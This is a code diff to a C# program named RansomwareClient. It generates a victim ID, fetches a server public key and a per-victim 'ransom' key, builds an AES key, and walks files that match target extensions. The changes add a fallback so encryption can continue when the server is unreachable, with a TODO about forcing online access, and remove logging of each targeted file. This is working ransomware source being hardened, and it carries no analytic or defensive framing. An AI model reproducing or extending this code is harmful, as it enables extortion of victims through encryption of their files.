@@ -18,11 +18,18 @@ namespace RansomwareClient
             //generate an unique id for the user, to attach to the server side
             var victim_id = Guid.NewGuid().ToString();
             //set keys
-            Utility.SetRegistryKeyValuePair("Id", victim_id, false);//set to true for live
-            Utility.SetRegistryKeyValuePair("Server Public Key", Utility.RequestFromServer("publickey"));
+            Utility.SetRegistryKeyValuePair("Id", victim_id, false); //set to true for live
+            var server_key = Utility.RequestFromServer("publickey");
+            Utility.SetRegistryKeyValuePair("Server Public Key", server_key);
+            if (server_key == string.Empty)
+            {
+                //TODO: have some local keys public keys that can be swapped later for unique keys to allow continued encryption and force online access;
+                return;
+            }
             var AES = GetAES();
             var symmetric_key = Encoding.UTF8.GetBytes(Convert.ToBase64String(AES.Key.Concat(AES.IV).ToArray()));
             var public_key = Utility.RequestFromServer($"ransom/{victim_id}");
+
             Utility.SetRegistryKeyValuePair("Public Key", public_key);
 
             //encrypt symmetric key
@@ -86,8 +93,6 @@ namespace RansomwareClient
                 if (split.Length <= 0) continue;
                 var extension = split[split.Length - 1];
                 if (!App.TARGET_FILE_EXTENSIONS.Contains(extension)) continue;
-                Console.WriteLine(filename);
-
                 var fi = new FileInfo(filename);
 
                 var entryName = filename.Substring(folderOffset);
